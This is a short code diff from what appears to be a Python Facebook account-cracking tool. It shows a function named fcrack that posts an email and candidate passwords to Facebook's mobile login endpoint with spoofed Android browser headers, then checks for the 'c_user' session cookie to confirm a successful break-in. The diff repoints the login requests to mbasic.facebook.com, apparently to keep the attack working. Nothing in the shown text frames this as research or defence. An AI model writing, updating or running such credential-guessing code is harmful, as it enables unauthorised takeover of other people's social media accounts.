@@ -967,7 +967,7 @@ def fcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority':'free.facebook.com',
+			header_freefb = {'authority':'mbasic.facebook.com',
 			'upgrade-insecure-requests': '1',
 			'viewport-width': '1080',
 			'method': 'GET',
@@ -987,7 +987,7 @@ def fcrack(uid,pwx,tl):
 			'sec-ch-ua-mobile': '?1',
 			'sec-ch-ua-platform': '"Android"',
 			'user-agent': ua}
-			lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+			lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
